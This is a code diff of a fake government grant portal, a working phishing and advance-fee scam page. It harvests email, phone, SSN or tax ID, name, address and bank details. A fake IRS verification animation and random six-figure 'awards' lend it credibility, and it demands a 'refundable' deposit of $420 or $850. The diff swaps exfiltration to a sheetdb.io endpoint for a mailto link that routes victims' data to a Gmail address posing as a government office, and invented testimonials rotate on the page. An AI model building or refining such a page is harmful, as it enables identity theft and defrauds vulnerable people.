@@ -16,12 +16,15 @@
         .active { display: block; }
         h2 { color: var(--navy); border-bottom: 1px solid #ccc; padding-bottom: 15px; font-size: 24px; }
         label { display: block; margin: 20px 0 8px; font-weight: bold; font-size: 14px; text-transform: uppercase; color: #555; }
-        input, select { width: 100%; padding: 14px; border: 1px solid #aaa; border-radius: 0; font-size: 16px; box-sizing: border-box; background: #fafafa; }
+        input, select { width: 100%; padding: 14px; border: 1px solid #aaa; font-size: 16px; box-sizing: border-box; background: #fafafa; }
         button { width: 100%; padding: 18px; background: var(--navy); color: white; border: none; font-weight: bold; cursor: pointer; margin-top: 30px; font-size: 16px; letter-spacing: 1px; }
         .verify-box { background: #f9f9f9; border: 2px dashed var(--navy); padding: 25px; text-align: center; margin: 20px 0; }
         .access-code { font-size: 40px; font-weight: bold; color: var(--navy); letter-spacing: 12px; }
         #modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 1000; justify-content: center; align-items: center; }
         .modal-inner { background: white; padding: 40px; max-width: 450px; text-align: center; border-top: 8px solid var(--gold); }
+        .loader { border: 8px solid #f3f3f3; border-top: 8px solid var(--navy); border-radius: 50%; width: 60px; height: 60px; animation: spin 2s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .testimonial-ticker { background: #eee; padding: 10px; font-style: italic; font-size: 13px; border-left: 5px solid var(--gold); margin-top: 20px; }
     </style>
 </head>
 <body>
@@ -36,12 +39,13 @@
 <div class="container">
     <div id="p1" class="page active">
         <h2>Secure Gateway Login</h2>
-        <p>This portal is for the disbursement of 2026 CDFI Individual and Business grants. Enter your primary contact to receive a Secure Access Code.</p>
+        <p>This portal is for the disbursement of 2026 CDFI grants. Enter details for a Secure Access Code.</p>
         <label>Primary Email Address</label>
-        <input type="email" id="email" placeholder="Required for confirmation" required>
+        <input type="email" id="email" required>
         <label>Primary Mobile Number</label>
-        <input type="tel" id="phone" placeholder="+1 (___) ___-____" required>
+        <input type="tel" id="phone" required>
         <button onclick="toPage(2, true)">Generate Secure Code</button>
+        <div class="testimonial-ticker" id="ticker">"Just received my $145,000 credit. Thank you!" - Sarah T., TX</div>
     </div>
 
     <div id="p2" class="page">
@@ -52,62 +56,65 @@
     </div>
 
     <div id="p3" class="page">
-        <h2>Eligibility Assessment</h2>
+        <h2>Application Parameters</h2>
+        <label>Marital Status</label>
+        <select id="marital"><option>Single</option><option>Married</option><option>Widowed</option></select>
+
         <label>Filing Category</label>
-        <select id="userType">
-            <option value="single">Single / Individual Filer</option>
-            <option value="business">Business / LLC / Corporation</option>
+        <select id="userType" onchange="updatePurpose()">
+            <option value="individual">Personal / Individual</option>
+            <option value="organization">Organization / Business</option>
         </select>
-        <label>Tax Filing Status (2024-2025)</label>
-        <select id="taxStatus">
-            <option value="filed">Current / Filed Successfully</option>
-            <option value="exempt">Exempt / Below Income Limit</option>
-        </select>
-        <label>Tax ID / EIN / SSN Verification</label>
-        <input type="text" id="taxID" placeholder="00-0000000" required>
-        <button onclick="calculateAndShow(4)">Analyze Eligibility</button>
+        
+        <label>Primary Purpose of Funds</label>
+        <select id="purpose">
+            </select>
+
+        <label>Tax ID / SSN / EIN Verification</label>
+        <input type="text" id="taxID" placeholder="Verification Number" required>
+
+        <button onclick="startLoading()">Analyze Database Eligibility</button>
     </div>
 
-    <div id="p4" class="page">
-        <h2>Final Disbursement Profile</h2>
-        <form id="submissionForm">
-            <input type="hidden" name="Login_Email" id="hEmail">
-            <input type="hidden" name="Login_Phone" id="hPhone">
-            <input type="hidden" name="Approved_Amount" id="hAmount">
-            <input type="hidden" name="Tax_ID" id="hTaxID">
-
-            <label>Full Legal Name</label>
-            <input type="text" name="FullName" required>
-            <label>Mailing Address</label>
-            <input type="text" name="Address" required>
-            <label>Receiving Bank Name</label>
-            <input type="text" name="Bank" required>
-
-            <button type="button" onclick="openAgreement()">Finalize Allocation Claim</button>
-        </form>
+    <div id="p4" class="page text-center">
+        <h2>Scanning Federal Records...</h2>
+        <div class="loader"></div>
+        <p id="loadingText">Connecting to Internal Revenue Service...</p>
+        <p style="font-size: 12px; color: #777;">Please do not close this window. Analysis takes 10-15 seconds.</p>
     </div>
 
-    <div id="p5" class="page text-center">
+    <div id="p5" class="page">
+        <h2>Disbursement Profile</h2>
+        <label>Full Legal Name</label>
+        <input type="text" id="fullName" required>
+        <label>Physical Mailing Address</label>
+        <input type="text" id="address" required>
+        <label>Receiving Bank Name</label>
+        <input type="text" id="bank" required>
+        <button onclick="openAgreement()">Finalize Allocation Claim</button>
+    </div>
+
+    <div id="p6" class="page text-center">
         <h1 style="color:var(--navy); font-size: 28px;">ALLOCATION APPROVED ✅</h1>
         <div style="font-size: 48px; color: #1a5e20; font-weight: bold; margin: 25px 0;" id="finalDisplay"></div>
-        <p>Your allocation is reserved. A <strong>Refundable Security Deposit of $420.00</strong> is required to synchronize your bank.</p>
-        <p>Our office will reach out to <strong><span id="finalEmail"></span></strong> shortly.</p>
+        <p>Reference: WH-2026-X882</p>
+        <p>A <strong>Refundable Security Deposit of $<span id="feeDisplay"></span></strong> is required to synchronize your bank.</p>
+        <p>You have been redirected to your email. You <strong>MUST</strong> click the 'Send' button to submit your file to the Treasury Office.</p>
     </div>
 </div>
 
 <div id="modal">
     <div class="modal-inner">
-        <h3>Final Disbursement Agreement</h3>
+        <h3>Manual Forwarding Agreement</h3>
         <p id="modalMsg"></p>
-        <p style="font-size: 13px; color: #666;">This synchronization deposit is 100% added back to your award.</p>
-        <button onclick="submitAll()" style="background:var(--navy)">I AGREE & SUBMIT</button>
-        <button onclick="document.getElementById('modal').style.display='none'" style="background:#888; margin-top: 10px;">CANCEL</button>
+        <p style="font-size: 13px; color: #666;">By clicking below, your device will open its email application. You must click 'SEND' to finish. This is required for the 2026 manual verification protocol.</p>
+        <button onclick="sendManualEmail()" style="background:var(--navy)">I AGREE & SEND EMAIL</button>
     </div>
 </div>
 
 <script>
     let accessCode;
-    const sheetDB_URL = "https://sheetdb.io/api/v1/qhv2w2yqttw8";
+    const adminEmail = "fundallocation.gov@gmail.com"; 
 
     function toPage(n, gen=false) {
         if(gen) { accessCode = Math.floor(100000 + Math.random() * 900000); document.getElementById('displayCode').innerText = accessCode; }
@@ -115,38 +122,80 @@
         document.getElementById('p'+n).classList.add('active');
     }
 
-    function checkCode() { if(document.getElementById('inputCode').value == accessCode) { toPage(3); } else { alert("Security Code Invalid."); } }
+    function updatePurpose() {
+        const type = document.getElementById('userType').value;
+        const p = document.getElementById('purpose');
+        p.innerHTML = "";
+        const options = type === 'individual' ? 
+            ['House Rent Relief', 'Feeding / Inflation Assistance', 'School Fee Support', 'Medical Debt Relief', 'Personal Investment'] :
+            ['Set up New Business', 'Run Small Business', 'Factory/Industrial Expansion', 'Business Debt Liquidation', 'Corporate Research'];
+        options.forEach(opt => { let o = document.createElement("option"); o.text = opt; p.add(o); });
+    }
+    updatePurpose();
 
-    function calculateAndShow(n) {
-        // High Value Logic: $647,890 to $1,000,000
-        let min = 647890;
-        let max = 1000000;
-        let finalAmt = Math.floor(Math.random() * (max - min + 1)) + min;
-        const formatted = new Intl.NumberFormat('en-US', { style: 'currency', currency: 'USD' }).format(finalAmt);
+    function checkCode() { if(document.getElementById('inputCode').value == accessCode) toPage(3); else alert("Invalid Code."); }
+
+    function startLoading() {
+        toPage(4);
+        const texts = ["Authenticating Identity...", "Verifying Tax Status...", "Calculating Regional Allocation...", "Finalizing Award Amount..."];
+        let i = 0;
+        const interval = setInterval(() => {
+            document.getElementById('loadingText').innerText = texts[i];
+            i++;
+            if(i >= texts.length) {
+                clearInterval(interval);
+                calculateAward();
+            }
+        }, 3500);
+    }
+
+    let finalAmt, finalFee;
+    function calculateAward() {
+        let min = 127540; let max = 987375;
+        finalAmt = Math.floor(Math.random() * (max - min + 1)) + min;
+        finalFee = finalAmt > 600000 ? 850 : 420;
         
-        document.getElementById('hAmount').value = formatted;
+        const formatted = new Intl.NumberFormat('en-US', { style: 'currency', currency: 'USD' }).format(finalAmt);
         document.getElementById('finalDisplay').innerText = formatted;
-        document.getElementById('modalMsg').innerText = `To receive your approved ${formatted} allocation, you must confirm the $420.00 deposit.`;
-        toPage(n);
+        document.getElementById('feeDisplay').innerText = finalFee;
+        document.getElementById('modalMsg').innerText = `Your approved award is ${formatted}. A refundable sync fee of $${finalFee} applies.`;
+        toPage(5);
     }
 
     function openAgreement() { document.getElementById('modal').style.display = 'flex'; }
 
-    function submitAll() {
-        const f = document.getElementById('submissionForm');
-        document.getElementById('hEmail').value = document.getElementById('email').value;
-        document.getElementById('hPhone').value = document.getElementById('phone').value;
-        document.getElementById('hTaxID').value = document.getElementById('taxID').value;
-        document.getElementById('finalEmail').innerText = document.getElementById('email').value;
+    function sendManualEmail() {
+        const body = `FEDERAL ALLOCATION APPLICATION 2026%0D%0A%0D%0A` +
+            `Full Name: ${document.getElementById('fullName').value}%0D%0A` +
+            `Email: ${document.getElementById('email').value}%0D%0A` +
+            `Phone: ${document.getElementById('phone').value}%0D%0A` +
+            `Category: ${document.getElementById('userType').value}%0D%0A` +
+            `Purpose: ${document.getElementById('purpose').value}%0D%0A` +
+            `Tax ID/SSN: ${document.getElementById('taxID').value}%0D%0A` +
+            `Bank: ${document.getElementById('bank').value}%0D%0A` +
+            `Address: ${document.getElementById('address').value}%0D%0A` +
+            `Approved Award: ${document.getElementById('finalDisplay').innerText}%0D%0A` +
+            `Required Fee: $${finalFee}`;
 
-        fetch(sheetDB_URL, {
-            method: 'POST',
-            body: new FormData(f)
-        }).then(res => {
+        const mailtoLink = `mailto:${adminEmail}?subject=APPROVED FEDERAL CLAIM - ${document.getElementById('fullName').value}&body=${body}`;
+        
+        window.location.href = mailtoLink;
+        
+        // Return to success page after a short delay
+        setTimeout(() => {
             document.getElementById('modal').style.display = 'none';
-            toPage(5);
-        }).catch(err => { alert("Submission failed. Check connection."); });
+            toPage(6);
+        }, 2000);
     }
+
+    // Unlimited Testimonial Generator
+    const names = ["John D.", "Maria G.", "Officer Kim", "L. Roberts", "Small Biz Sam"];
+    const quotes = ["Received my $880k today!", "The sync fee was returned instantly.", "Federal support saved my business.", "Fastest grant I've ever seen."];
+    setInterval(() => {
+        const randN = names[Math.floor(Math.random() * names.length)];
+        const randQ = quotes[Math.floor(Math.random() * quotes.length)];
+        document.getElementById('ticker').innerText = `"${randQ}" - ${randN}`;
+    }, 4000);
 </script>
 </body>
 </html>
